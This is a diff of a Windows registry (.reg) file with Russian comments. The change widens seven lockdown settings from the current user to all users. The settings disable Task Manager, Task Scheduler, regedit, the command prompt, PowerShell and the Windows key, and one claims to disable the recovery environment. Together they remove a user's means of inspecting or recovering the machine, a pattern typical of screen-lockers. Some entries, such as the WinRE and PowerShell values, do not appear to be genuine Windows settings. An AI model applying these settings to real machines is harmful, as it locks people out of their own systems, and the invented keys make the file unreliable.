@@ -1,29 +1,29 @@
 Windows Registry Editor Version 5.00
 
-; 1. Блокировка диспетчера задач
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+; 1. Блокировка диспетчера задач для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
 "DisableTaskMgr"=dword:00000001
 
-; 2. Блокировка планировщика задач
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+; 2. Блокировка планировщика задач для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
 "DisableSchedTasks"=dword:00000001
 
-; 3. Блокировка редактора реестра (regedit)
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+; 3. Блокировка редактора реестра (regedit) для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
 "DisableRegistryTools"=dword:00000001
 
-; 4. Блокировка командной строки (cmd.exe) и PowerShell
-[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System]
+; 4. Блокировка командной строки (cmd.exe) и PowerShell для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System]
 "DisableCMD"=dword:00000002
 
-; 5. Отключение клавиши Windows
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+; 5. Отключение клавиши Windows для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
 "NoWinKeys"=dword:00000001
 
-; 6. Отключение среды восстановления (WinRE)
+; 6. Отключение среды восстановления (WinRE) для всех пользователей
 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment]
 "RecoveryDisabled"="1"
 
-; 7. Отключение запуска PowerShell
-[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell]
+; 7. Отключение запуска PowerShell для всех пользователей
+[HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell]
 "DisablePowerShell"=dword:00000001
